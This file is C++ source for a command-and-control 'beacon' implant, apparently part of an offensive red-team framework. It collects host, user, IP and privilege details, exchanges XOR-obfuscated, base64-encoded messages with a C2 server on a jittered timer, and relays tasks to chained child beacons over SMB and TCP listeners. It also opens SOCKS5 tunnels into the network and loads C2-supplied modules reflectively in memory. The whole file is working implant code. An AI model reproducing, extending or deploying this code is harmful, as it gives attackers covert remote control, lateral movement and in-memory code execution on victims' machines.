#include "Beacon.hpp"

#include <algorithm>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <random>
#include <thread>

#ifdef __linux__

#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <dlfcn.h>

#include <MemoryModule.h>


typedef ModuleCmd* (*constructProc)();

#elif _WIN32

#include <wtsapi32.h>
#include <MemoryModule.hpp>


#define INFO_BUFFER_SIZE 32767
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))

typedef ModuleCmd* (*constructProc)();

#pragma comment(lib, "Wtsapi32.lib")

#endif



#ifdef __linux__


#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>


std::string getInternalIP() 
{
    struct ifaddrs* ifAddrStruct = nullptr;
    getifaddrs(&ifAddrStruct);

    std::string ips = "";
    for (struct ifaddrs* ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) 
    {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) 
        {
            if(!ips.empty())
                ips+="\n";

            void* tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
            char addressBuffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);

            // Filter out loopback
            if (std::string(ifa->ifa_name) != "lo")
            {
                ips += ifa->ifa_name;
                ips += ": ";
                ips += addressBuffer;
            }
        }
    }
    if (ifAddrStruct) 
        freeifaddrs(ifAddrStruct);
    
    return ips;
}


int getCurrentPID() 
{
    return static_cast<int>(getpid());
}


#elif _WIN32


#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>


#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")


std::string getInternalIP() 
{
    WSADATA wsaData;
    char hostname[256];

    std::string ips = "";
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
    {
        return ips;
    }

    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) 
    {
        WSACleanup();
        return ips;
    }

    struct addrinfo hints = {}, *result = nullptr;
    hints.ai_family = AF_INET;  // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) 
    {
        WSACleanup();
        return ips;
    }

    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
    {
        if(!ips.empty())
            ips+="\n";

        struct sockaddr_in* sockaddr_ipv4 = reinterpret_cast<struct sockaddr_in*>(ptr->ai_addr);
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ipStr, sizeof(ipStr));
        ips += ipStr;
    }

    freeaddrinfo(result);
    WSACleanup();

    return ips;
}


int getCurrentPID() 
{
    return static_cast<int>(GetCurrentProcessId());
}


enum IntegrityLevel 
{
    INTEGRITY_UNKNOWN,
    UNTRUSTED_INTEGRITY,
    LOW_INTEGRITY,
    MEDIUM_INTEGRITY,
    HIGH_INTEGRITY,
};


IntegrityLevel GetCurrentProcessIntegrityLevel() 
{
    HANDLE hToken = NULL;
    BOOL result = false;
    TOKEN_USER* tokenUser = NULL;
    DWORD dwLength = 0;

    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    DWORD token_info_length = 0;
    if (::GetTokenInformation(hToken, TokenIntegrityLevel,
        nullptr, 0, &token_info_length) ||
        ::GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return INTEGRITY_UNKNOWN;
    }

    auto token_label_bytes = std::make_unique<char[]>(token_info_length);
    TOKEN_MANDATORY_LABEL* token_label =
        reinterpret_cast<TOKEN_MANDATORY_LABEL*>(token_label_bytes.get());
    if (!::GetTokenInformation(hToken, TokenIntegrityLevel,
        token_label, token_info_length,
        &token_info_length)) {
        return INTEGRITY_UNKNOWN;
    }
    DWORD integrity_level = *::GetSidSubAuthority(
        token_label->Label.Sid,
        static_cast<DWORD>(*::GetSidSubAuthorityCount(token_label->Label.Sid) -
            1));

    if (integrity_level < SECURITY_MANDATORY_LOW_RID)
        return UNTRUSTED_INTEGRITY;

    if (integrity_level < SECURITY_MANDATORY_MEDIUM_RID)
        return LOW_INTEGRITY;

    if (integrity_level >= SECURITY_MANDATORY_MEDIUM_RID &&
        integrity_level < SECURITY_MANDATORY_HIGH_RID) {
        return MEDIUM_INTEGRITY;
    }

    if (integrity_level >= SECURITY_MANDATORY_HIGH_RID)
        return HIGH_INTEGRITY;

    return INTEGRITY_UNKNOWN;
}
#endif


Beacon::Beacon()
{
        m_beaconHash = random_string(SizeBeaconHash);
        m_aliveTimerMs = 1000;

        std::srand(std::time(nullptr));

        m_ips = getInternalIP();

        int pid = getCurrentPID();
        m_pid = std::to_string(pid);

#ifdef __linux__

    char hostname[2048];
    char username[2048];
    gethostname(hostname, 2048);
    getlogin_r(username, 2048);

    m_hostname = hostname;
    m_username = username;

    uid_t uid = geteuid ();
    struct passwd *pw = getpwuid (uid);
    if (pw)
        m_username = std::string(pw->pw_name);

    struct utsname unameData;
    uname(&unameData);

    m_additionalInfo = unameData.sysname;
    m_additionalInfo += "\n";
    m_additionalInfo += unameData.nodename;
    m_additionalInfo += "\n";
    m_additionalInfo += unameData.release;
    m_additionalInfo += "\n";
    m_additionalInfo += unameData.version;
    m_additionalInfo += "\n";
    m_additionalInfo += unameData.machine;

    m_arch = unameData.machine;

    m_privilege = "user";
    if(m_username=="root")
        m_privilege = "root";
    
        m_os = unameData.sysname;
        m_os += " ";
        m_os += unameData.release;

#elif _WIN32

    TCHAR  infoBuf[INFO_BUFFER_SIZE];
    DWORD  bufCharCount = INFO_BUFFER_SIZE;

    // Get and display the name of the computer.
    m_hostname = "unknown";
    if( GetComputerName( infoBuf, &bufCharCount ) )
        m_hostname = infoBuf;

    std::string username1;
    if( GetUserName( infoBuf, &bufCharCount ) )
        username1 = infoBuf;

    // ??
    std::string acctName;
    std::string domainname;

    TOKEN_USER tokenUser;
    ZeroMemory(&tokenUser, sizeof(TOKEN_USER));
    DWORD tokenUserLength = 0;

    PTOKEN_USER pTokenUser;
    GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, NULL,      
    0, &tokenUserLength);
    pTokenUser = (PTOKEN_USER) new BYTE[tokenUserLength];

    if (GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, pTokenUser, tokenUserLength, &tokenUserLength))
    {
        TCHAR szUserName[_MAX_PATH];
        DWORD dwUserNameLength = _MAX_PATH;
        TCHAR szDomainName[_MAX_PATH];
        DWORD dwDomainNameLength = _MAX_PATH;
        SID_NAME_USE sidNameUse;
        LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
        acctName=szUserName;
        domainname=szDomainName;
        delete[] pTokenUser;
    }

    if(!domainname.empty())
        m_username+=domainname;
    else if(!m_hostname.empty())
        m_username+=m_hostname;
    else 
        m_username+=".";

    m_username+="\\";
    if(!acctName.empty())
        m_username+=acctName;
    else if(!username1.empty())
        m_username+=username1;
    else 
        m_username+="unknow";

    SYSTEM_INFO systemInfo = { 0 };
    GetNativeSystemInfo(&systemInfo);

    m_arch = "x64";
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        m_arch = "x86";

        m_os = "Windows";

    IntegrityLevel integrityLevel = GetCurrentProcessIntegrityLevel();

    m_privilege = "-";
        if (integrityLevel == INTEGRITY_UNKNOWN)
                m_privilege = "UNKNOWN";
        else if (integrityLevel == UNTRUSTED_INTEGRITY)
                m_privilege = "UNTRUSTED";
        else if (integrityLevel == LOW_INTEGRITY)
                m_privilege = "LOW";
        else if (integrityLevel == MEDIUM_INTEGRITY)
                m_privilege = "MEDIUM";
        else if (integrityLevel == HIGH_INTEGRITY)
                m_privilege = "HIGH";

#endif

        m_instructionHandlers.emplace(EndCmd, &Beacon::handleEndInstruction);
        m_instructionHandlers.emplace(SleepCmd, &Beacon::handleSleepInstruction);
        m_instructionHandlers.emplace(ListenerCmd, &Beacon::handleListenerInstruction);
        m_instructionHandlers.emplace(Socks5Cmd, &Beacon::handleSocks5Instruction);
        m_instructionHandlers.emplace(LoadC2ModuleCmd, &Beacon::handleLoadModuleInstruction);
        m_instructionHandlers.emplace(UnloadC2ModuleCmd, &Beacon::handleUnloadModuleInstruction);
}


void Beacon::run()
{
    bool exit = false;
    while (!exit)
    {
        try 
        {
            checkIn();

            exit = runTasks();
            
            sleep();
        }
        catch(const std::exception& ex)
        {
            sleep();
        }
        catch (...) 
        {
            sleep();
        }
    }

    checkIn();
}


bool Beacon::initConfig(const std::string& config)
{
        try
        {
                nlohmann::json beaconConfig = nlohmann::json::parse(config);

                if (!beaconConfig.contains("xorKey") || !beaconConfig.contains("ModulesConfig"))
                        return false;

                m_key = beaconConfig["xorKey"].get<std::string>();
                m_modulesConfig = beaconConfig["ModulesConfig"];
        }
        catch (const nlohmann::json::exception&)
        {
                return false;
        }

        return true;
}


// Distribute commands from C2 address to this beacon and child beacons
bool Beacon::cmdToTasks(const std::string& input)
{
    std::string data;
    try
    {
        // Decode the base64-encoded input string from the C2 server
        data = base64_decode(input);
    } 
    catch (...)
    {
        // If decoding fails, return false
        return false;
    }

    // Decrypt the data using the beacon's XOR key
    XOR(data, m_key);

    // Parse the decrypted data into a MultiBundleC2Message object
    MultiBundleC2Message multiBundleC2Message;
    multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());

    // Iterate over each BundleC2Message in the multi-bundle message
    for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
    {
        BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

        // Check if the message is addressed to this beacon
        std::string beaconhash = bundleC2Message->beaconhash();
        if(beaconhash==m_beaconHash)
        {
            // Queue each C2Message task for this beacon
            for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
            {
                const C2Message& c2Message = bundleC2Message->c2messages(j);
                m_tasks.push(c2Message);
            }
        }
        // Otherwise, the message is for a child session
        else
        {
            // Iterate through all listeners
            for(int i=0; i<m_listeners.size(); i++)
            {
                // Check each session for a matching beacon hash
            for(std::size_t j=0; j<m_listeners[i]->getNumberOfSession(); j++)
                {
                    std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);

                    if(ptr->getBeaconHash()==beaconhash)
                    {
                        // Queue each C2Message task for the matching child session
                        for (int k = 0; k < bundleC2Message->c2messages_size(); k++) 
                        {
                            const C2Message& c2Message = bundleC2Message->c2messages(k);
                            m_listeners[i]->queueTask(beaconhash, c2Message);
                        }
                    }
                }
            }
        }
    }

    // Return true if all tasks were distributed successfully
    return true;
}


// Create the response message from the results of all the commmands send to this beacon and child beacons
bool Beacon::taskResultsToCmd(std::string& output)
{
    // Handle results of commands address to this particular Beacon
    MultiBundleC2Message multiBundleC2Message;
    BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();

    // TODO check of m_taskResult contain a getInfo cmd and add context info if it does
    bundleC2Message->set_beaconhash(m_beaconHash);
    bundleC2Message->set_hostname(m_hostname);
    bundleC2Message->set_username(m_username);
    bundleC2Message->set_arch(m_arch);
    bundleC2Message->set_privilege(m_privilege);
    bundleC2Message->set_os(m_os);
    bundleC2Message->set_lastProofOfLife("0");
    bundleC2Message->set_internalIps(m_ips);
    bundleC2Message->set_processId(m_pid);
    bundleC2Message->set_additionalInformation(m_additionalInfo);

    while(!m_taskResult.empty())
    {
        C2Message c2MessageRet=m_taskResult.front();
        // C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
        // addedC2MessageRet->CopyFrom(c2MessageRet);
        bundleC2Message->add_c2messages(c2MessageRet);
        m_taskResult.pop();
    }

    // Handle results of commands address to child sessions
        for(int i=0; i<m_listeners.size(); i++)
        {
                for(std::size_t j=0; j<m_listeners[i]->getNumberOfSession(); j++)
        {
            std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);

            BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
            
            // TODO check of m_taskResult contain a getInfo cmd and add context info if it does
            bundleC2Message->set_beaconhash(ptr->getBeaconHash());
            bundleC2Message->set_listenerhash(ptr->getListenerHash());
            bundleC2Message->set_hostname(ptr->getHostname());
            bundleC2Message->set_username(ptr->getUsername());
            bundleC2Message->set_arch(ptr->getArch());
            bundleC2Message->set_privilege(ptr->getPrivilege());
            bundleC2Message->set_os(ptr->getOs());
            bundleC2Message->set_lastProofOfLife(ptr->getLastProofOfLife());
            bundleC2Message->set_internalIps(ptr->getInternalIps());
            bundleC2Message->set_processId(ptr->getProcessId());
            bundleC2Message->set_additionalInformation(ptr->getAdditionalInformation());

            C2Message c2Message = ptr->getTaskResult();
            while(!c2Message.instruction().empty())
            {
                // C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
                // addedC2MessageRet->CopyFrom(c2Message);
                bundleC2Message->add_c2messages(c2Message);
                c2Message = ptr->getTaskResult();
            }
        }
    }

    std::string data;
    multiBundleC2Message.SerializeToString(&data);

    XOR(data, m_key);
    output = base64_encode(data);

    return true;
}


// Execute the appropriate modules and instructions based on tasks received from the C2.
// Returns true if an instruction indicates the beacon should exit, otherwise false.
bool Beacon::runTasks()
{
    // Execute all recurring module commands and collect their results.
    for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
    {
        C2Message c2RetMessage;
        int result = (*it)->recurringExec(c2RetMessage);

        // If the module executed successfully, store the result for response construction.
        if (result)
            m_taskResult.push(c2RetMessage);
    }

    // Process each individual task assigned to this beacon.
    // These are one-time commands sent from the C2 server.
    while (!m_tasks.empty())
    {
        C2Message c2Message = m_tasks.front();
        m_tasks.pop();

        C2Message c2RetMessage;
        
        // Execute the instruction and generate the response.
        bool exit = execInstruction(c2Message, c2RetMessage);

        // Store the result of the execution.
        m_taskResult.push(std::move(c2RetMessage));

        // If the instruction indicates the beacon should exit, return immediately.
        if (exit)
            return exit;
    }

    // Add a heartbeat or "proof-of-life" message for each active listener.
    // This helps the C2 track which listeners are still alive and their current state.
    for (int i = 0; i < m_listeners.size(); i++)
    {
        C2Message listenerProofOfLife;

        listenerProofOfLife.set_instruction(ListenerPollCmd);                            // Indicate this is a poll/proof message.
        listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());                // Include unique listener identifier.
        listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());     // Include listener status/metadata.

        // Add the heartbeat to the response queue.
        m_taskResult.push(listenerProofOfLife);
    }

    // No exit signal was received; continue beacon execution.
    return false;
}


void Beacon::sleep()
{
        static std::mt19937 gen{std::random_device{}()};
        static std::uniform_real_distribution<double> dis(0.8, 1.2);

        int jitteredTimeMs = static_cast<int>(m_aliveTimerMs * dis(gen));

        std::this_thread::sleep_for(std::chrono::milliseconds(jitteredTimeMs));
}


// Main function that execute command comming from the C2
// Commands releated to modules are handle by them
// Commands releated to beacon internal functions are handle in this function
bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string instruction = c2Message.instruction();
    std::string cmd = c2Message.cmd();
    std::string uuid = c2Message.uuid();

    c2RetMessage.set_instruction(instruction);
    c2RetMessage.set_cmd(cmd);
    c2RetMessage.set_uuid(uuid);

    auto it = m_instructionHandlers.find(instruction);
    if (it != m_instructionHandlers.end())
    {
        return (this->*(it->second))(c2Message, c2RetMessage);
    }

    return handleModuleInstruction(c2Message, c2RetMessage);
}

bool Beacon::handleEndInstruction(C2Message&, C2Message& c2RetMessage)
{
    c2RetMessage.set_returnvalue(CmdStatusSuccess);
    return true;
}

bool Beacon::handleSleepInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string newSleepTimer = c2Message.cmd();
    try
    {
        m_aliveTimerMs = std::stof(newSleepTimer) * 1000;
        newSleepTimer = std::to_string(m_aliveTimerMs) + "ms";
    }
    catch (const std::invalid_argument&)
    {
        newSleepTimer = CmdStatusFail;
    }

    c2RetMessage.set_returnvalue(newSleepTimer);
    return false;
}

bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string cmd = c2Message.cmd();
    std::vector<std::string> splitedCmd;
    std::string delimiter = " ";
    splitList(cmd, delimiter, splitedCmd);

    if (splitedCmd.empty())
        return false;

    if (splitedCmd[0] == StartCmd)
    {
        if (splitedCmd[1] == ListenerSmbType)
        {
            if (splitedCmd.size() != 4)
                return false;

            std::string host = splitedCmd[2];
            std::string pipeName = splitedCmd[3];

            auto object = std::find_if(m_listeners.begin(), m_listeners.end(),
                [&](const std::unique_ptr<Listener>& obj){ return obj->getParam2() == pipeName; });

            if (object != m_listeners.end())
            {
                c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
                return false;
            }
            else
            {
                auto listenerSmb = std::make_unique<ListenerSmb>(host, pipeName);
                std::string hash = listenerSmb->getListenerHash();
                std::string metadata = listenerSmb->getListenerMetadata();
                m_listeners.push_back(std::move(listenerSmb));
                c2RetMessage.set_cmd(cmd);
                c2RetMessage.set_data(metadata);
                c2RetMessage.set_returnvalue(hash);
                return false;
            }
        }
        else if (splitedCmd[1] == ListenerTcpType)
        {
            if (splitedCmd.size() != 4)
                return false;

            std::string localHost = splitedCmd[2];
            int localPort;
            try
            {
                localPort = std::stoi(splitedCmd[3]);
            }
            catch (const std::invalid_argument&)
            {
                c2RetMessage.set_errorCode(ERROR_PORT_FORMAT);
                return false;
            }

            auto object = std::find_if(m_listeners.begin(), m_listeners.end(),
                [&](const std::unique_ptr<Listener>& obj){ return obj->getParam2() == splitedCmd[3]; });

            if (object != m_listeners.end())
            {
                c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
                return false;
            }
            else
            {
                std::unique_ptr<ListenerTcp> listenerTcp = std::make_unique<ListenerTcp>(localHost, localPort);
                int ret = listenerTcp->init();
                if (ret > 0)
                {
                    std::string hash = listenerTcp->getListenerHash();
                    std::string metadata = listenerTcp->getListenerMetadata();
                    m_listeners.push_back(std::move(listenerTcp));
                    c2RetMessage.set_cmd(cmd);
                    c2RetMessage.set_data(metadata);
                    c2RetMessage.set_returnvalue(hash);
                    return false;
                }
                else
                {
                    c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
                    return false;
                }
            }
        }
    }
    else if (splitedCmd[0] == StopCmd)
    {
        std::string listenerHash = splitedCmd[1];
        auto object = std::find_if(m_listeners.begin(), m_listeners.end(),
            [&](const std::unique_ptr<Listener>& obj){ return obj->getListenerHash().rfind(listenerHash, 0) == 0; });

        if (object != m_listeners.end())
        {
            c2RetMessage.set_cmd(cmd);
            c2RetMessage.set_returnvalue((*object)->getListenerHash());
            m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
            return false;
        }
        else
        {
            c2RetMessage.set_errorCode(ERROR_HASH_NOT_FOUND);
            return false;
        }
    }

    return false;
}

bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    SPDLOG_TRACE("Socks5 {} {} {}", c2Message.instruction(), c2Message.cmd(), c2Message.pid());

    c2RetMessage.set_pid(c2Message.pid());

    if (c2Message.cmd() == StartCmd)
    {
        return false;
    }
    else if (c2Message.cmd() == StopSocksCmd)
    {
        for (int i = 0; i < m_socksTunnelClient.size(); i++)
            m_socksTunnelClient[i].reset(nullptr);
        return false;
    }
    else if (c2Message.cmd() == InitCmd)
    {
        SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
        std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
        try
        {
            uint32_t ip_dst = std::stoi(c2Message.data());
            uint16_t port = std::stoi(c2Message.args());
            int initResult = socksTunnelClient->init(ip_dst, port);
            if (initResult)
            {
                m_socksTunnelClient.push_back(std::move(socksTunnelClient));
                return false;
            }
            else
            {
                SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
                c2RetMessage.set_data("fail");
                return false;
            }
        }
        catch (const std::invalid_argument&)
        {
            SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
            c2RetMessage.set_errorCode(ERROR_GENERIC);
            return false;
        }
        SPDLOG_DEBUG("Socks5 init Finished");
    }
    else if (c2Message.cmd() == RunCmd)
    {
        SPDLOG_DEBUG("Socks5 run {}", c2Message.pid());
        for (int i = 0; i < m_socksTunnelClient.size(); i++)
        {
            SPDLOG_DEBUG("Socks5 run id with handle {}, id available {}", c2Message.pid(), m_socksTunnelClient[i]->getId());
            if (m_socksTunnelClient[i] != nullptr)
            {
                if (m_socksTunnelClient[i]->getId() == c2Message.pid())
                {
                    SPDLOG_DEBUG("Socks5 run process {}", c2Message.pid());
                    SPDLOG_DEBUG("Socks5 run input {}", c2Message.data().size());
                    std::string dataOut;
                    int res = m_socksTunnelClient[i]->process(c2Message.data(), dataOut);
                    SPDLOG_DEBUG("Socks5 run output {}", dataOut.size());
                    SPDLOG_DEBUG("Socks5 run process ok {}", c2Message.pid());
                    if (res <= 0)
                    {
                        SPDLOG_DEBUG("Socks5 run stop {}", c2Message.pid());
                        m_socksTunnelClient[i].reset(nullptr);
                        c2RetMessage.set_cmd(StopCmd);
                    }
                    SPDLOG_DEBUG("Socks5 run process finished {}", c2Message.pid());
                    c2RetMessage.set_data(dataOut);
                }
            }
        }
        SPDLOG_DEBUG("Socks5 run Finished");
    }
    else if (c2Message.cmd() == StopCmd)
    {
        SPDLOG_DEBUG("Socks5 stop {}", c2Message.pid());
        for (int i = 0; i < m_socksTunnelClient.size(); i++)
        {
            if (m_socksTunnelClient[i] != nullptr)
            {
                if (m_socksTunnelClient[i]->getId() == c2Message.pid())
                {
                    m_socksTunnelClient[i].reset(nullptr);
                }
            }
        }
        SPDLOG_DEBUG("Socks5 stop Finished");
    }

    SPDLOG_DEBUG("Finishing");
    m_socksTunnelClient.erase(std::remove_if(m_socksTunnelClient.begin(), m_socksTunnelClient.end(),
                     [](const std::unique_ptr<SocksTunnelClient>& ptr) { return ptr == nullptr; }),
              m_socksTunnelClient.end());
    SPDLOG_DEBUG("m_socksTunnelClient size {}", m_socksTunnelClient.size());

    return false;
}

bool Beacon::handleLoadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
#ifdef __linux__
    const std::string inputfile = c2Message.inputfile();
    std::string baseFilename = inputfile.substr(inputfile.find_last_of("/\\") + 1);
    const std::string buffer = c2Message.data();

    SPDLOG_DEBUG("LoadC2Module inputfile {}, buffer {}", baseFilename, buffer.size());

    void* handle = NULL;
    handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
    if (handle == NULL)
    {
        c2RetMessage.set_errorCode(ERROR_LOAD_LIBRARY);
        return false;
    }

    SPDLOG_DEBUG("MemoryLoadLibrary handle {}", handle);

    std::string funcName = baseFilename;
    funcName = funcName.substr(3);
    funcName = funcName.substr(0, funcName.length() - 3);
    funcName += "Constructor";

    SPDLOG_DEBUG("MemoryLoadLibrary funcName {}", funcName);

    constructProc construct;
    construct = (constructProc)dlsym(handle, funcName.c_str());
    if (construct == NULL)
    {
        c2RetMessage.set_errorCode(ERROR_GET_PROC_ADDRESS);
        return false;
    }

    SPDLOG_DEBUG("MemoryLoadLibrary construct success" );

    ModuleCmd* moduleCmd = construct();
    unsigned long long moduleHash = moduleCmd->getHash();
    auto object = std::find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
                [&](const std::unique_ptr<ModuleCmd>& obj){ return obj->getHash() == moduleHash; });
    if (object != m_moduleCmd.end())
    {
        c2RetMessage.set_errorCode(ERROR_MODULE_ALREADY_LOADED);
        dlclose(handle);
        return false;
    }

    std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
    nlohmann::json config = m_modulesConfig;
    for (auto& it : config.items())
    {
        unsigned long long hash = djb2(it.key());
        if (moduleCmd_.get()->getHash() == hash)
        {
            moduleCmd_.get()->initConfig(it.value());
        }
    }
    m_moduleCmd.push_back(std::move(moduleCmd_));
    c2RetMessage.set_returnvalue(CmdStatusSuccess);
    return false;
#elif _WIN32
    const std::string inputfile = c2Message.inputfile();
    const std::string buffer = c2Message.data();

    HMEMORYMODULE handle = NULL;
    handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
    if (handle == NULL)
    {
        DWORD errorMessageID = ::GetLastError();
        if(errorMessageID == 0)
            return false;
        LPSTR messageBuffer = nullptr;
        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                    NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
        std::string message(messageBuffer, size);
        LocalFree(messageBuffer);
        c2RetMessage.set_errorCode(ERROR_LOAD_LIBRARY);
        return false;
    }

    constructProc construct;
    construct = (constructProc)MemoryGetProcAddress(handle, reinterpret_cast<LPCSTR>(0x01));
    if (!construct != NULL)
    {
        c2RetMessage.set_errorCode(ERROR_GET_PROC_ADDRESS);
        return false;
    }

    ModuleCmd* moduleCmd = construct();
    unsigned long long moduleHash = moduleCmd->getHash();
    auto object = std::find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
                [&](const std::unique_ptr<ModuleCmd>& obj){ return obj->getHash() == moduleHash; });
    if (object != m_moduleCmd.end())
    {
        c2RetMessage.set_errorCode(ERROR_MODULE_ALREADY_LOADED);
        MemoryFreeLibrary(handle);
        return false;
    }

    std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
    nlohmann::json config = m_modulesConfig;
    for (auto& it : config.items())
    {
        unsigned long long hash = djb2(it.key());
        if (moduleCmd_.get()->getHash() == hash)
        {
            moduleCmd_.get()->initConfig(it.value());
        }
    }
    m_moduleCmd.push_back(std::move(moduleCmd_));
    c2RetMessage.set_returnvalue(CmdStatusSuccess);
    return false;
#endif
}

bool Beacon::handleUnloadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string moduleName = c2Message.cmd();
    unsigned long long moduleHash = djb2(moduleName);
    auto object = std::find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
                [&](const std::unique_ptr<ModuleCmd>& obj)
                {
                    if (obj->getName().empty())
                        return obj->getHash() == moduleHash;
                    else
                        return obj->getName() == moduleName;
                });
    if (object != m_moduleCmd.end())
    {
#ifdef __linux__
        Dl_info  DlInfo;
        if ((dladdr((void*)((*object)->getHash()), &DlInfo)) != 0)
        {
            dlclose(DlInfo.dli_fbase);
        }
#elif _WIN32
        HMODULE hModule = NULL;
        if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                (LPCTSTR)(*object)->getHash(), &hModule))
        {
            FreeLibrary(hModule);
        }
#endif
        m_moduleCmd.erase(std::remove(m_moduleCmd.begin(), m_moduleCmd.end(), *object));
        c2RetMessage.set_returnvalue(CmdStatusSuccess);
        return false;
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_MODULE_NOT_FOUND);
        return false;
    }
}

bool Beacon::handleModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string instruction = c2Message.instruction();
    unsigned long long moduleHash = djb2(instruction);
    bool isModuleFound = false;
    for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
    {
        if (instruction == (*it)->getName() || moduleHash == (*it)->getHash())
        {
            (*it)->process(c2Message, c2RetMessage);
            isModuleFound = true;
        }
    }
    if (!isModuleFound)
    {
        c2RetMessage.set_returnvalue(CmdModuleNotFound);
    }
    return false;
}
